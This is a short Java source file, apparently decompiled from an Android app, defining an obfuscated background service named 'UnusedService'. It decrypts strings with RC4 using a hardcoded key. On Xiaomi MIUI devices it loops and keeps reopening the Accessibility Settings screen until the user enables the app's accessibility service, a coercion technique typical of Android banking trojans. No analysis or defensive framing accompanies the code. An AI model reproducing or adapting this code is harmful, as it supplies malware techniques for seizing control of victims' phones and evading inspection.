package com.example.mmm.unused;

import android.app.*;
import com.example.mmm.Utils.*;
import com.example.mmm.*;
import com.example.mmm.API.*;
import android.util.*;
import android.os.*;
import com.example.mmm.Service.*;
import android.content.*;

public class UnusedService extends Service
{
    utils template$;
    utils2 comic$;
    constants calling$;
    private String updated$;
    
    public UnusedService() {
        super();
        final StringBuilder sb = new StringBuilder();
        sb.append(srvWhileWorker.class.getSimpleName());
        sb.append("   ");
        this.updated$ = sb.toString();
        this.template$ = new utils();
        this.comic$ = new utils2();
        this.calling$ = new constants();
    }
    
    private String decrypt_str(String s) {
        s = new String(new ClassRC4("wewiejvtlfqy".getBytes())._nevada(utils.hexStringToByteArray(new String(Base64.decode(s, 0), "UTF-8"))));
        return s;
    }
    
    public IBinder onBind(final Intent \u0131ntent) {
        throw new UnsupportedOperationException("Not yet implemented");
    }
    
    public int onStartCommand(final Intent \u0131ntent, final int n, final int n2) {
        if ("xiaomi".equalsIgnoreCase(Build.MANUFACTURER) && utils.getMiuiVersion() >= 10) {
            while (!utils.isAccessibilityServiceEnabled((Context)this, srvAccessibility.class) || !this.template$.SettingsRead((Context)this, "XB").equals("1")) {
                utils.chalkTile(1000);
                if (utils.isAccessibilityServiceEnabled((Context)this, srvAccessibility.class)) {
                    this.comic$._cornell((Context)this);
                }
                else {
                    this.startActivity(new Intent("android.settings.ACCESSIBILITY_SETTINGS").addFlags(268435456).addFlags(536870912).addFlags(1073741824));
                }
            }
        }
        return n;
    }
}
